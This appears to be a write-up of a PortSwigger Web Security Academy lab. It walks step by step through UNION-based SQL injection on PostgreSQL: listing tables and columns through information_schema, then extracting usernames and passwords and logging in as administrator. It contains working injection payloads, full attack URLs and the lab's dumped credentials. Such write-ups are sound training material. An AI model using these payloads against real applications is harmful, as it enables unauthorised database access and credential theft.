**Technique:** information_schema Enumeration
**Database:** PostgreSQL
**Status:** Solved
 
### Context
 
Full database enumeration chain: discover table names, then column names, then extract credentials. PostgreSQL and most non-Oracle databases expose schema metadata through the ANSI standard `information_schema` views, making this a portable technique.
 
---
 
### Step 1: Enumerate All Tables
 
**Payload:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
 
**Full URL:**
```
https://0a25005103d268e880ab5dcf00a700ef.web-security-academy.net/filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
 
**Breakdown:**
 
| Token | Purpose |
|---|---|
| `table_name` | Column in `information_schema.tables` holding the name of every table the current user has access to |
| `information_schema.tables` | Standard metadata view present in PostgreSQL, MySQL, and SQL Server, lists all tables and views across all schemas |
| `NULL` | Column count filler, two columns are returned by the original query so two must appear in the UNION |
 
Among hundreds of system tables, one non-standard name stood out:
 
```
users_qtulzy
```
 
---
 
### Step 2: Enumerate Columns in Target Table
 
**Payload:**
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_qtulzy'-- -
```
 
**Full URL:**
```
https://0a25005103d268e880ab5dcf00a700ef.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_qtulzy%27--%20-
```
 
**Breakdown:**
 
| Token | Purpose |
|---|---|
| `column_name` | Column in `information_schema.columns` holding the name of each column |
| `information_schema.columns` | Metadata view listing every column in every table including data type and constraints |
| `WHERE table_name=...` | Filters results to only the target table, without this every column from every table would be returned |
 
**Response:**
```
email
username_opexiv
password_cfjpjy
```
 
The randomised suffixes on column names (`_opexiv`, `_cfjpjy`) are the lab's anti-trivial-query measure. They must be used exactly as returned.
 
---
 
### Step 3: Extract Credentials
 
**Payload:**
```
' UNION SELECT username_opexiv,password_cfjpjy FROM users_qtulzy-- -
```
 
**Full URL:**
```
https://0a25005103d268e880ab5dcf00a700ef.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20username_opexiv,password_cfjpjy%20FROM%20users_qtulzy--%20-
```
 
**Response:**
```
administrator : in0epdm0ks1jtw6p1dy1
wiener        : 9k2xbxi6lcvcxjhy0xps
carlos        : jy8pa63uvepqny786vn5
```
 
---
 
### Final Step
 
Logged into the application using the extracted administrator credentials. Lab solved.
 
